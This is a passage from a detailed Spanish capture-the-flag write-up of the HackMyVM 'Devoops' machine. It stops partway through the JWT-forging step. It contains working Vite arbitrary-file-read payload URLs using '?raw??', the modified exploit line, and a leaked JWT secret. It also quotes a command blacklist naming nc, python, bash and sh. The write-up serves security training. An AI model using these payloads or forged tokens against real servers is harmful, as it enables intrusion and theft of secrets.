# Writeup extremadamente detallado de **Devoops** (HackMyVM)

> **Entorno controlado y autorizado.** Todo lo que se describe aquí se ha realizado dentro de un laboratorio de práctica tipo CTF / máquina vulnerable. No debe reproducirse fuera de entornos autorizados.

---

# Índice

1. Objetivo del writeup y enfoque
2. Problema al importar la máquina en VMware
3. Motivo por el que se usa VirtualBox para la víctima y VMware para Kali
4. Configuración de red para que ambas máquinas se vean
   1. Ajuste en VirtualBox
   2. Por qué se elige la tarjeta MediaTek Wi‑Fi 6 MT7921
   3. Ajuste en VMware Workstation / Player
   4. Qué significa usar modo puente
   5. Por qué cambia la IP de Kali
5. Preparación del directorio de trabajo
6. Descubrimiento de la IP de la víctima
   1. Escaneo de descubrimiento con Nmap
   2. Explicación completa de `-n` y `-sn`
   3. Por qué aparecen muchos hosts
   4. Cómo identificar la VM correcta mediante la MAC
   5. Qué es un OUI y por qué importa aquí
7. Escaneo completo de puertos y servicios
   1. Comando usado
   2. Explicación completa de todas las flags de Nmap
   3. Análisis de la respuesta del puerto 3000
   4. Por qué eso apunta a Vite / Node.js
   5. Qué es `server.allowedHosts`
   6. Qué significa que sea un entorno de desarrollo
8. Inspección manual de la web
9. Fuzzing de rutas con `ffuf`
   1. Primer fuzzing y por qué devuelve demasiado ruido
   2. Explicación completa de las flags de `ffuf`
   3. Uso del filtro por tamaño `--fs`
   4. Interpretación de `/server`, `/sign` y `/execute`
10. Identificación exacta de Vite
    1. Inspección de `@vite/client`
    2. Qué es Vite realmente
    3. Por qué el puerto 3000 es una pista habitual
11. Búsqueda de vulnerabilidades con `searchsploit`
    1. Qué es Searchsploit
    2. Qué devuelve la consulta sobre Vite
    3. Explicación de `searchsploit -m`
    4. Por qué conviene leer siempre el exploit antes de ejecutarlo
12. Entendiendo la vulnerabilidad de Vite
    1. Qué es Arbitrary File Read
    2. Qué hace `@fs`
    3. Qué pasa con `?raw??`
    4. Por qué el exploit original fallaba
    5. Corrección manual del script
13. Lectura de archivos arbitrarios
    1. Lectura de `/etc/passwd`
    2. Qué información útil aporta `/etc/passwd`
    3. Usuarios interesantes detectados
14. Fuzzing de ficheros útiles con `ffuf`
    1. Uso de `quickhits.txt`
    2. Explicación de `--fs` y `--fc`
    3. Archivos encontrados
15. Análisis detallado del archivo `.env`
    1. Qué es un `.env`
    2. Qué es `JWT_SECRET`
    3. Qué es `COMMAND_FILTER`
    4. Por qué esta información es crítica
16. JWT explicado desde cero
    1. Qué es un JWT
    2. Qué son header, payload y signature
    3. Qué significa `HS256`
    4. Qué son `uid`, `role`, `iat` y `exp`
17. Uso de **jwt.io** para decodificar y forjar el token
    1. Qué es `https://www.jwt.io/`
    2. Cómo se analiza el token original de `/sign`
    3. Cómo se modifica el payload
    4. Por qué basta con conocer el secret
    5. Creación del token de administrador
18. Descubrimiento del endpoint interesante `/execute`
19. Uso de Burp Suite paso a paso
    1. Por qué usar Burp aquí
    2. Intercept con FoxyProxy
    3. Envío a Repeater
    4. Inserción del header `Authorization: Bearer ...`
    5. Qué cambia al usar el token correcto
20. Explicación completa de `Authorization: Bearer <token>`
21. Primeras pruebas de ejecución remota de comandos
    1. Uso de `curl`
    2. Explicación completa del comando
    3. Interpretación de la salida del `id`
22. Restricciones de comandos y blacklist
23. Reverse shell en Node.js
    1. Por qué Node.js y no PHP
    2. Por qué no sirve la opción con `nc`
    3. Configuración en revshells.com
24. Creación y servido de `shell.js`
    1. Archivo local en Kali
    2. Servidor Python HTTP
25. Descarga del fichero hacia la víctima con `wget`
    1. Explicación detallada del comando completo
    2. Qué significa `-O`
    3. Por qué `/tmp`
26. Puesta en escucha y ejecución del payload
27. Reverse shell obtenida: análisis de lo conseguido
28. Nota adicional: bypass conceptual de blacklist con fragmentación de cadenas
29. Post-explotación inicial en el sistema
30. Descubrimiento de Gitea y repositorios
31. Inspección de la base de datos `gitea.db`
    1. Qué hace `strings`
    2. Qué hace `grep -A 5`
    3. Localización de commits relevantes
32. Lectura de commits concretos con Git
    1. Explicación completa de `GIT_DIR=... git -c safe.directory=... show ...`
    2. Por qué hace falta `safe.directory`
    3. Búsqueda de claves privadas en el diff
33. Reconstrucción de la clave privada de `hana`
    1. Por qué aparecen `+` delante de cada línea
    2. Uso de `echo` para guardar la clave
    3. Uso de `sed 's/^+//'`
34. Acceso SSH como `hana`
    1. Explicación completa de `ssh -i ... -o StrictHostKeyChecking=no`
    2. Error por permisos inseguros
    3. Por qué la clave privada debe ser `600`
35. Obtención de la user flag
36. Escalada de privilegios con `sudo -l`
    1. Qué hace `sudo -l`
    2. Qué información nos devuelve
37. Uso de GTFOBins
    1. Qué es GTFOBins
    2. Por qué es tan útil en privesc
38. Abuso de `/sbin/arp` vía sudo
    1. Lectura de `/etc/shadow`
    2. Qué es `/etc/shadow`
39. Crackeo del hash con Hashcat
    1. Qué es Hashcat
    2. Identificación del modo correcto
    3. Qué significa `1800 sha512crypt`
    4. Explicación completa del comando de crackeo
40. Cambio a `root` con `su`
41. Obtención de la root flag
42. Resumen técnico de la cadena de ataque completa
43. Lecciones importantes que deja esta máquina

---

# 1. Objetivo del writeup y enfoque

Aquí no se busca hacer un resumen corto ni ir únicamente a por la flag. El objetivo es explicar **absolutamente toda la cadena de ataque**, deteniéndose en cada punto donde normalmente un writeup breve pasa demasiado rápido.

En esta máquina aparecen varios conceptos que, si es la primera vez que los tocas, pueden resultar confusos:

- diferencia entre NAT y bridge en virtualización,
- cómo identificar una VM por su MAC,
- cómo interpretar una respuesta rara de Nmap,
- qué es Vite y por qué una respuesta delata un entorno de desarrollo,
- cómo se explota una lectura arbitraria de archivos,
- qué son los JWT y cómo se forjan si se expone el secret,
- cómo se usa Burp en un caso real,
- qué significa realmente `Authorization: Bearer ...`,
- cómo se pasa de RCE a reverse shell,
- por qué un repositorio Git puede filtrar secretos aunque luego se hayan borrado,
- cómo se abusa un binario permitido en `sudo` para escalar privilegios,
- y cómo se crackea un hash de `/etc/shadow`.

La idea es que puedas releer este documento incluso tiempo después y seguir entendiendo el porqué de cada paso.

---

# 2. Problema al importar la máquina en VMware

Al intentar importar la máquina **Devoops** en VMware apareció un error, por lo que ese hipervisor dejó de ser una opción práctica para la víctima.

![Imagen 1 - Error al importar la máquina en VMware](./files/imagen1_vmware_error.png)

Cuando ocurre algo así, lo importante no es quedarse bloqueado en el hipervisor concreto, sino entender qué alternativas tenemos:

- seguir usando VMware para la máquina atacante,
- levantar la víctima en otro hipervisor compatible,
- y hacer que ambas puedan verse por red.

Eso fue exactamente lo que se hizo: **Kali quedó en VMware** y **Devoops se levantó en VirtualBox**.

---

# 3. Motivo por el que se usa VirtualBox para la víctima y VMware para Kali

Esto no se hizo por capricho, sino porque:

1. la máquina víctima fallaba al importarla en VMware,
2. pero sí podía abrirse en VirtualBox,
3. mientras que Kali ya estaba preparada en VMware,
4. y no era necesario reinstalar o mover Kali solo por eso.

El verdadero problema no era “tener dos hipervisores”, sino **hacer que sus máquinas virtuales estuvieran en la misma red**.

---

# 4. Configuración de red para que ambas máquinas se vean

## 4.1. Ajuste en VirtualBox

En VirtualBox se configuró la red de la máquina Devoops así:

- seleccionar la máquina,
- abrir **Configuración**,
- ir a **Red**,
- en **Adaptador 1** escoger **Conectado a: Adaptador puente**,
- y en **Nombre** seleccionar la interfaz física real.

En este caso:

**MediaTek Wi‑Fi 6 MT7921 Wireless LAN Card**

![Imagen 2 - Selección del adaptador físico en VirtualBox](./files/imagen2_virtualbox_adapter.png)

## 4.2. Por qué se elige esa tarjeta y no otra

Porque esa es la interfaz física por la que el host Windows está saliendo realmente a la red.

Esto es importante. El host puede tener varias interfaces:

- Wi‑Fi,
- Ethernet,
- adaptadores virtuales de VMware,
- adaptadores virtuales de VirtualBox,
- VPNs,
- interfaces deshabilitadas.

Si escoges una interfaz que no es la que está conectada a la red real, el bridge no sirve para lo que queremos. La VM no quedará en tu red doméstica de verdad o quedará en un estado inútil.

Por eso aquí se eligió la **MediaTek Wi‑Fi 6 MT7921**, que es la tarjeta Wi‑Fi real del equipo.

## 4.3. Ajuste equivalente en VMware para Kali

En VMware se hizo un proceso paralelo.

Primero, en el editor de redes virtuales:

- **Editar**,
- **Editor de red virtual**,
- dentro de la información de VMnet,
- seleccionar **En puente**,
- y escoger la **misma tarjeta física** que en VirtualBox.

![Imagen 3 - VMnet en bridge apuntando a la misma NIC física](./files/imagen3_vmware_vmnet_bridge.png)

Después, en la configuración concreta de la Kali:

- click derecho sobre la máquina,
- **Configuración**,
- **Adaptador de red**,
- **Conexión de red**,
- **Conexión en puente**.

![Imagen 4 - Kali configurada en bridge en VMware](./files/imagen4_vmware_kali_bridge.png)

## 4.4. Qué significa usar modo puente

Este es uno de los puntos más importantes de toda la preparación.

Cuando una máquina virtual está en **NAT**, normalmente:

- vive detrás del host,
- usa una red virtual privada creada por el hipervisor,
- sale a internet a través del host,
- pero no se comporta como un equipo independiente dentro de la red física.

En cambio, cuando está en **bridge**:

- la VM se conecta directamente a la red física,
- solicita IP al router de esa red,
- aparece como un dispositivo más dentro de la LAN,
- y puede hablar directamente con otros dispositivos de esa red.

En términos sencillos:

- con NAT, la VM está “escondida detrás del host”,
- con bridge, la VM está “enchufada” directamente a la misma red que el resto.

Eso era justo lo que necesitábamos para que **Kali en VMware** y **Devoops en VirtualBox** se vieran entre sí aunque usen hipervisores distintos.

## 4.5. Por qué cambia la IP de Kali

Al cambiar la interfaz de red de NAT a bridge, VMware desconecta momentáneamente la red de la VM y luego la vuelve a enlazar en el nuevo modo.

Por eso se corta la conectividad durante un momento.

Después, la Kali hace lo que haría cualquier equipo nuevo en una red doméstica: pedir una IP mediante DHCP al router.

Al ejecutar:

```bash
ip a
```

apareció una IP nueva, por ejemplo `192.168.1.42/24`.

![Imagen 5 - IP nueva de Kali tras cambiar a modo puente](./files/imagen5_ip_a_kali.png)

Eso indica que ahora Kali está dentro de la red real `192.168.1.0/24`.

---

# 5. Preparación del directorio de trabajo

Se preparó una carpeta específica para tener ordenado todo el material de esta máquina:

```bash
cd ~/Desktop
cd HackMyVM
mkdir Devoops
cd Devoops
```

Esto parece un detalle pequeño, pero es una buena costumbre porque durante la explotación vas a acabar generando y guardando:

- scripts descargados,
- shells,
- hashes,
- notas,
- capturas,
- tokens,
- ficheros temporales.

Si no organizas eso desde el principio, luego cuesta más seguir la trazabilidad del ataque.

---

# 6. Descubrimiento de la IP de la víctima

Una vez ambas máquinas están en la misma red, toca averiguar la IP de la víctima.

El comando usado fue:

```bash
sudo nmap -n -sn 192.168.1.42/24
```

## 6.1. Explicación completa del comando

### `sudo`

Nmap puede funcionar sin privilegios en algunos casos, pero para muchos tipos de sondeos y detección resulta mejor usar `sudo`, ya que así puede enviar determinados paquetes de manera más completa.

### `nmap`

Es la herramienta por excelencia para descubrimiento y enumeración de red. Permite:

- descubrir hosts activos,
- escanear puertos,
- detectar servicios,
- identificar versiones,
- lanzar scripts NSE,
- e incluso inferir sistema operativo en ciertos contextos.

### `-n`

Le dice a Nmap que **no haga resolución DNS**.

Eso quiere decir que si encuentra una IP viva, no intentará preguntar “¿qué nombre tiene este host?”.

Ventajas:

- va más rápido,
- hace menos ruido,
- evita depender del DNS,
- y el resultado es más limpio cuando solo nos importa la IP y la MAC.

### `-sn`

Antes se conocía como “ping scan”.

Significa: **solo descubrimiento de hosts**.

Es decir:

- no escanea puertos,
- no intenta detectar servicios,
- solo responde a la pregunta: **¿qué hosts están vivos en esta red?**

### `192.168.1.42/24`

Aquí hay un detalle que al principio puede confundir.

Aunque el comando parece apuntar a `192.168.1.42`, el `/24` hace que en realidad el rango sea **toda la red** `192.168.1.0/24`.

Con máscara `/24`:

- red: `192.168.1.0`
- hosts típicos: `192.168.1.1` a `192.168.1.254`
- broadcast: `192.168.1.255`

Por tanto, se está sondeando toda la red local, no solo la IP de Kali.

## 6.2. Resultado observado

La salida mostró muchos hosts vivos, entre ellos uno con MAC de VirtualBox:

```text
Nmap scan report for 192.168.1.41
Host is up (0.00071s latency).
MAC Address: 08:00:27:60:E8:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

## 6.3. Por qué aparecen muchos hosts

Porque ahora ya **no** estás en una red privada de VMware. Al haber configurado bridge:

- Kali está dentro de tu red doméstica real,
- Devoops también,
- y Nmap ve todos los dispositivos conectados a esa misma red.

Por eso salen:

- el router,
- móviles,
- otros ordenadores,
- televisiones,
- IoT,
- la propia Kali,
- y la víctima.

No es un fallo. Es exactamente lo esperable al escanear una LAN real.

## 6.4. Cómo identificar la víctima mediante la MAC

La clave fue esta parte:

```text
08:00:27:60:E8:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

Sabemos que la víctima se levantó en **VirtualBox**, así que si aparece un host cuya MAC pertenece al bloque de VirtualBox, ese host es un candidato clarísimo a ser la máquina objetivo.

## 6.5. Qué es el OUI

**OUI** significa **Organizationally Unique Identifier**.

Son los **primeros 3 bytes** de una dirección MAC, y sirven para identificar al fabricante.

Ejemplos útiles en este caso:

- `08:00:27` → VirtualBox
- `00:0C:29` → VMware
- `48:E7:DA` → AzureWave
- `3C:BD:3E` → Xiaomi
- `A4:43:8C` → Arris

Eso explica por qué Nmap fue capaz de mostrar el fabricante asociado a la MAC.

## 6.6. Conclusión del descubrimiento

La IP de la víctima quedó identificada como:

```text
192.168.1.41
```

porque:

- está viva,
- pertenece a la misma red,
- y su MAC coincide con un adaptador de **Oracle VirtualBox**.

---

# 7. Escaneo completo de puertos y servicios

Una vez conocida la IP de la víctima, el siguiente paso lógico es enumerar todos los puertos y servicios.

Se utilizó:

```bash
sudo nmap -p- --open -sCV -Pn -T5 -vvv -oN fullscan 192.168.1.41
```

## 7.1. Explicación completa de todas las flags

### `-p-`

Indica a Nmap que escanee **todos los puertos TCP**, del `1` al `65535`.

Sin esta opción, Nmap suele escanear un conjunto más pequeño de puertos comunes. Aquí no queremos perdernos nada.

### `--open`

Hace que en la salida solo se muestren los puertos que estén **abiertos**.

Eso ayuda a limpiar ruido visual, porque no necesitamos ver miles de puertos cerrados en el informe final.

### `-sCV`

Esta parte realmente combina dos cosas:

- `-sC` → ejecuta los scripts por defecto de Nmap (NSE default scripts)
- `-sV` → intenta detectar la **versión del servicio** que corre en cada puerto

Por eso suele escribirse `-sCV` como combinación habitual.

### `-Pn`

Le dice a Nmap que **no haga host discovery previo** y trate el host como si estuviera vivo desde el principio.

Esto es útil cuando:

- algunos sistemas no responden a ping,
- el firewall filtra respuestas ICMP,
- o simplemente ya sabemos que el host está arriba y queremos pasar directamente al escaneo.

### `-T5`

Controla la agresividad / temporización del escaneo.

- `T0` muy lento,
- `T3` normal,
- `T4` rápido,
- `T5` muy agresivo.

En laboratorio suele usarse sin problema, pero en entornos reales puede generar más ruido o producir resultados menos fiables si la red es sensible.

### `-vvv`

Incrementa el nivel de **verbosidad**. Al usar tres `v`, Nmap va informando con más detalle de lo que hace.

Esto es útil para seguimiento en tiempo real.

### `-oN fullscan`

Guarda la salida en formato “normal” en un fichero llamado `fullscan`.

Es buena práctica porque:

- conservas evidencia,
- puedes releer el escaneo más tarde,
- y no dependes de tener la terminal abierta.

## 7.2. Resultado principal

El puerto más relevante fue el `3000/tcp`.

La respuesta incluía cosas como:

- `HTTP/1.1 400 Bad Request`
- `HTTP/1.1 403 Forbidden`
- `Blocked request. This host (undefined) is not allowed.`
- `allow this host, add undefined to server.allowedHosts in vite.config.js.`

## 7.3. Interpretación de lo que devuelve Nmap

### Puerto 3000 abierto

El puerto `3000` es muy habitual en:

- servidores de desarrollo web,
- aplicaciones Node.js,
- Express,
- herramientas frontend modernas,
- paneles temporales,
- entornos de testing.

### `SERVICE: ppp?`

Nmap no siempre identifica bien servicios poco comunes o aplicaciones web no estándar. A veces hace una conjetura poco precisa. Aquí no nos interesa tanto esa etiqueta automática como la **respuesta HTTP real** que devuelve el servicio.

### `ttl 64`

No es una prueba absoluta, pero suele ser una pista de sistema Linux. Muchos sistemas Linux responden con TTL inicial 64.

## 7.4. Por qué esto apunta a Vite / Node.js

La parte decisiva es esta:

```text
allow this host, add undefined to `server.allowedHosts` in vite.config.js.
```

Eso no es una firma genérica de Apache ni de Nginx. Está mencionando directamente:

- `vite.config.js`
- `server.allowedHosts`

Eso delata un **servidor Vite**.

Vite es una herramienta moderna para desarrollo frontend. Se usa mucho en proyectos con:

- Vue,
- React,
- JavaScript moderno,
- TypeScript.

Además suele correr en puertos como `3000`, `5173` u otros de desarrollo.

## 7.5. Qué es `server.allowedHosts`

Es una configuración de seguridad del servidor de desarrollo de Vite.

Sirve para decir desde qué hosts o nombres se aceptan peticiones.

La idea es evitar que alguien acceda desde un host no previsto o que el servidor se use de forma indebida fuera del entorno esperado.

Si la petición llega con un host no permitido, el servidor responde bloqueándola.

## 7.6. Qué significa que sea un entorno de desarrollo

Esto es importante.

Un **entorno de desarrollo** no es lo mismo que un entorno de producción.

En desarrollo, a menudo se dejan cosas como:

- hot reload,
- mensajes verbosos,
- rutas internas,
- endpoints auxiliares,
- configuraciones débiles,
- exposición de recursos que jamás deberían ir a internet.

Eso convierte este tipo de entornos en objetivos muy interesantes.

Aquí ya tenemos la sospecha fuerte de que:

- la máquina corre Linux,
- hay una app Node.js / Vite,
- y quizá estamos frente a un servidor de desarrollo expuesto de forma insegura.

---

# 8. Inspección manual de la web

Al abrir en navegador:

```text
http://192.168.1.41:3000/
```

aparece contenido relacionado con:

**Creating a Vue.js + Express.js Project**

Eso encaja perfectamente con lo que ya insinuaba Nmap: un stack de desarrollo web.

Al hacer `CTRL + U` para ver el código fuente no apareció nada especialmente útil al principio. Eso no significa que no haya nada; simplemente que **la pista importante no estaba en un comentario obvio del HTML inicial**.

---

# 9. Fuzzing de rutas con `ffuf`

Se lanzó una enumeración de rutas:

```bash
ffuf -u http://192.168.1.41:3000/FUZZ -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100
```

## 9.1. Explicación detallada de las flags

### `-u`

Define la URL objetivo. `FUZZ` marca la posición donde `ffuf` irá sustituyendo palabras del diccionario.

En este caso probará:

- `/admin`
- `/login`
- `/server`
- `/sign`
- `/execute`
- etc.

### `-c`

Colorea la salida para hacerla más legible.

### `-w`

Indica el wordlist que se va a usar.

En este caso se usa una lista de directorios y nombres comunes de rutas web.

### `-t 100`

Lanza 100 hilos concurrentes. Eso hace el fuzzing bastante más rápido, aunque puede meter más presión sobre el servicio.

## 9.2. Por qué salió demasiada información

El problema fue que muchas rutas devolvían respuestas aparentemente válidas pero en realidad eran ruido: todas redirigían o devolvían el mismo contenido base.

Cuando en fuzzing muchas respuestas comparten:

- mismo status,
- mismo tamaño,
- mismo número de palabras,
- o misma longitud,

eso suele indicar una **respuesta comodín**.

En este caso muchas devolvían tamaño `414`.

## 9.3. Filtrado por tamaño con `--fs`

Se repitió el fuzzing así:

```bash
ffuf -u http://192.168.1.41:3000/FUZZ -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100 --fs 414
```

### `--fs 414`

`fs` significa **filter size**.

Le estamos diciendo a `ffuf`:

> No me muestres respuestas cuyo tamaño sea 414 bytes.

Como ese tamaño era el del ruido repetido, el resultado quedó mucho más limpio.

## 9.4. Rutas interesantes encontradas

Aparecieron estas:

```text
server   [Status: 200, Size: 21764]
sign     [Status: 200, Size: 189]
execute  [Status: 401, Size: 48]
```

### `/server`

Mostraba código o contenido relacionado con Vite.

### `/sign`

Devolvía un token JWT.

### `/execute`

Respondía `401 Unauthorized`, lo que ya es muy interesante, porque no dice “no existe”, sino “existe pero no tienes permiso”.

Eso suele ser mucho más prometedor que un 404.

---

# 10. Identificación exacta de Vite

En el código fuente se vio una referencia a:

```html
<script type="module" src="/@vite/client"></script>
```

Al abrir:

```text
http://192.168.1.41:3000/@vite/client
```

o su `view-source`, se pudo ver mejor el cliente de Vite y su versión, concretamente **vite 6.2.0**.

## 10.1. Qué es Vite

Vite es una herramienta moderna de desarrollo frontend.

Hace varias cosas:

- levanta un servidor de desarrollo,
- sirve módulos ES al navegador,
- recompila al vuelo,
- acelera la experiencia de desarrollo,
- y se integra muy bien con frameworks como Vue o React.

No es “el backend” como tal, aunque puede convivir con Express u otras piezas Node.js. Aquí el punto importante es que **su servidor de desarrollo está expuesto**.

## 10.2. Por qué el puerto 3000 es una pista habitual

Muchísimas herramientas de desarrollo Node.js usan puertos como `3000`, `3001`, `5173`, `8080`, etc. No es una prueba definitiva, pero sí una pista contextual muy fuerte.

---

# 11. Búsqueda de vulnerabilidades con `searchsploit`

Se consultó Searchsploit con algo como:

```bash
searchsploit vite
```

## 11.1. Qué es Searchsploit

Searchsploit es una herramienta incluida habitualmente en Kali que permite buscar exploits disponibles en la base de datos local de **Exploit-DB**.

Sirve para:

- localizar PoCs rápidos,
- revisar CVEs asociadas,
- descargar exploits al directorio actual,
- y estudiar cómo funciona una vulnerabilidad sin depender del navegador.

No sustituye a entender el fallo, pero acelera mucho la fase de investigación.

## 11.2. Resultado relevante

Apareció algo similar a:

```text
Vite 6.2.2 - Arbitrary File Read
```

con script asociado:

```text
multiple/remote/52111.py
```

Si el exploit aplica a **6.2.2** y nuestra máquina corre **6.2.0**, es razonable pensar que la versión instalada también es vulnerable, porque es anterior al parche.

## 11.3. Descarga local del exploit

Se copió con:

```bash
searchsploit -m multiple/remote/52111.py
```

### Qué hace `-m`

`-m` significa básicamente “mirror” o “copiar localmente”.

Es decir:

- localiza el exploit en la base de datos,
- y lo copia al directorio donde te encuentras.

Esto es cómodo porque te permite abrirlo, leerlo y modificarlo.

## 11.4. Por qué es obligatorio leer el exploit antes de usarlo

Este punto es importantísimo.

Nunca conviene ejecutar a ciegas un script de Searchsploit. Hay que leerlo porque:

- puede estar desactualizado,
- puede tener bugs,
- puede no ajustarse exactamente al caso,
- puede requerir cambiar una ruta,
- puede hacer algo diferente de lo que esperas.

Aquí precisamente pasó eso: el exploit estaba **mal adaptado** al bypass concreto y hubo que corregirlo.

---

# 12. Entendiendo la vulnerabilidad de Vite

## 12.1. Qué tipo de fallo es

La vulnerabilidad es de **Arbitrary File Read**, es decir, **lectura arbitraria de archivos**.

Eso significa que un atacante puede conseguir que el servidor devuelva contenido de archivos del sistema que no debería exponer.

No es todavía ejecución de comandos, pero ya es gravísimo porque puede revelar:

- secretos,
- claves privadas,
- tokens,
- archivos de configuración,
- código fuente,
- rutas internas,
- credenciales,
- variables de entorno.

## 12.2. Qué hace `@fs`

Vite tiene mecanismos para acceder a recursos del filesystem, pero en teoría restringidos. El problema es que, debido al fallo, se puede evadir esa restricción manipulando la query string.

## 12.3. La clave: `?raw??`

La descripción del exploit indica que al añadir determinadas terminaciones como:

- `?raw??`
- o combinaciones similares,

se pueden eludir comprobaciones internas y obtener el contenido de archivos arbitrarios.

La razón profunda es que ciertos caracteres finales se recortan o normalizan en unas fases del procesamiento, pero no en las expresiones regulares que validan la query string. Ese desfase lógico permite el bypass.

## 12.4. Por qué el exploit original fallaba

El script copiando desde Searchsploit probaba algo como:

```python
url = f"{target}{file_path}?raw"
```

Eso no activaba correctamente el bypass en este caso.

Por eso, al ejecutarlo, devolvía que no era vulnerable o que el archivo no existía.

## 12.5. Corrección manual

Se editó el script y se cambió por:

```python
url = f"{target}{file_path}?raw??"
```

Entonces sí funcionó.

Esto demuestra dos cosas muy importantes:

1. **la PoC no siempre está perfecta**, y
2. **entender el fallo vale más que ejecutar herramientas sin pensar**.

---

# 13. Lectura de archivos arbitrarios

## 13.1. Prueba con `/etc/passwd`

Se probó la lectura de un fichero muy típico para validación:

```text
http://192.168.1.41:3000/etc/passwd?raw??
```

Y el servidor devolvió el contenido dentro de un `export default "..."`.

Eso confirma que la vulnerabilidad existe y que podemos leer archivos reales del sistema.

## 13.2. Por qué se usa `/etc/passwd` para probar

Porque es un archivo:

- casi siempre presente en sistemas Linux,
- normalmente legible,
- muy útil para enumeración,
- y fácil de reconocer.

No contiene las contraseñas en texto claro, pero sí lista los usuarios del sistema, sus UIDs, homes y shells.

## 13.3. Qué información nos dio

Entre otros, aparecieron usuarios como:

- `runner`
- `hana`
- `gitea`
- `chrony`

Los más interesantes ofensivamente eran:

- `runner`: probablemente el usuario que ejecuta la app,
- `hana`: usuario humano / desarrollador,
- `gitea`: cuenta de servicio vinculada al sistema Git.

Especialmente relevante:

```text
hana:x:1001:100::/home/hana:/bin/sh
```

porque nos dice que existe una home real `/home/hana`.

---

# 14. Fuzzing de ficheros útiles con `ffuf`

Se lanzó esta búsqueda:

```bash
ffuf -u 'http://192.168.1.41:3000/FUZZ?raw??' -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --fs 414 --fc 500
```

## 14.1. Qué se está haciendo aquí

En lugar de fuzzear rutas web normales, aquí se están probando **nombres de archivos comunes** aprovechando la lectura arbitraria.

La variable `FUZZ` pasa a ser nombres tipo:

- `.env`
- `README.md`
- `etc/passwd`
- `etc/hosts`
- `package.json`
- etc.

## 14.2. Explicación de las flags específicas

### `--fs 414`

Filtra respuestas de tamaño 414, que ya sabíamos que eran ruido.

### `--fc 500`

`fc` significa **filter status code**.

Aquí le dices a `ffuf`:

> No me enseñes respuestas con código HTTP 500.

Eso limpia errores internos que no aportan valor en el resultado principal.

## 14.3. Resultados encontrados

Se detectaron archivos como:

```text
.env         [Status: 200]
etc/passwd   [Status: 200]
etc/hosts    [Status: 200]
README.md    [Status: 200]
package.json [Status: 403]
```

El hallazgo más importante fue sin duda `.env`.

---

# 15. Análisis detallado del archivo `.env`

Al visitar:

```text
http://192.168.1.41:3000/.env?raw??
```

apareció algo como:

```text
JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'
COMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'
```

## 15.1. Qué es un `.env`

Un archivo `.env` es un archivo de variables de entorno usado por aplicaciones para separar la configuración sensible del código.

Suele contener:

- secretos JWT,
- credenciales de base de datos,
- claves API,
- configuración de puertos,
- modos de ejecución,
- rutas.

Es una práctica común en desarrollo, precisamente para **no dejar secretos hardcodeados en el código fuente**. El problema es que si el `.env` queda expuesto, el daño es enorme.

## 15.2. Qué es `JWT_SECRET`

Es la clave secreta usada para firmar tokens JWT cuando el algoritmo es simétrico, como `HS256`.

Eso significa que quien conozca ese secret puede:

- generar tokens válidos,
- modificar payloads,
- y hacer que el servidor los acepte como auténticos.

## 15.3. Qué es `COMMAND_FILTER`

Es una lista negra de cadenas que la aplicación considera peligrosas dentro del parámetro de comandos.

Incluye cosas como:

- `nc`
- `python`
- `bash`
- `sh`
- `|`
- `&`
- `<`
- `>`
- `ls`
- `cat`
- `pwd`
- `grep`
- etc.

Eso nos está diciendo algo muy importante incluso antes de usar `/execute`:

**existe una funcionalidad que ejecuta comandos del sistema** y los desarrolladores han intentado “protegerla” con una blacklist.

Eso suele ser una mala señal de seguridad.

## 15.4. Por qué este archivo es crítico

El `.env` nos da dos cosas clave:

1. el **secreto JWT**, necesario para forjar autenticación,
2. y pistas sobre una **ejecución remota de comandos** filtrada torpemente.

Con ese único archivo prácticamente ya se perfila la explotación completa.

---

# 16. JWT explicado desde cero

Antes de usar `jwt.io`, conviene entender qué es un JWT.

## 16.1. Qué es un JWT

JWT significa **JSON Web Token**.

Es un formato de token que se usa mucho para autenticación y autorización en aplicaciones web.

Un JWT suele tener tres partes separadas por puntos:

```text
HEADER.PAYLOAD.SIGNATURE
```

Por ejemplo:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NzM3ODI1NTksImV4cCI6MTc3Mzc4NDM1OX0.C-tmjfY19_7RuPJsUGZZkjY3H-PQwI4w2BXrS7aW1Yw
```

## 16.2. Las tres partes

### Header

Indica metadatos del token, por ejemplo:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Esto significa:

- `alg`: algoritmo usado para firmar
- `typ`: tipo de token, aquí JWT

### Payload

Contiene las claims, es decir, los datos del usuario o del contexto.

Por ejemplo:

```json
{
  "uid": -1,
  "role": "guest",
  "iat": 1773782559,
  "exp": 1773784359
}
```

### Signature

Es la firma criptográfica que se calcula con:

- el header,
- el payload,
- y el secret.

Si el payload se modifica pero no se puede recomputar la firma correcta, el token deja de ser válido.

## 16.3. Qué significa `HS256`

`HS256` es HMAC con SHA-256.

Es un algoritmo **simétrico**, es decir:

- el servidor firma con un secret,
- y valida con ese mismo secret.

Por tanto, si un atacante conoce el secret, puede firmar tokens igual que el servidor.

## 16.4. Qué significan `uid`, `role`, `iat`, `exp`

- `uid`: identificador del usuario
- `role`: rol asociado, por ejemplo `guest` o `admin`
- `iat`: issued at, momento de emisión
- `exp`: expiration time, momento de expiración

En este caso, los campos más interesantes eran claramente:

- `uid`
- `role`

porque son los que probablemente determinan privilegios.

---

# 17. Uso de **jwt.io** para decodificar y forjar el token

El usuario te pidió expresamente que esto se explicara bien, así que aquí va con calma.

La herramienta web usada fue:

**https://www.jwt.io/**

## 17.1. Para qué sirve jwt.io

`jwt.io` es una web muy conocida para:

- **decodificar** JWTs,
- visualizar el header y el payload,
- ver con qué algoritmo están firmados,
- y también **recalcular la firma** si introduces el secret correcto.

No es que “hackee” el token. Lo que hace es ayudarte a trabajar con el formato JWT. Si tú ya conoces el `secret`, entonces puedes crear un token legítimamente firmado desde el punto de vista del servidor.

## 17.2. Token original obtenido de `/sign`

La ruta `/sign` devolvía un token como este:

```text
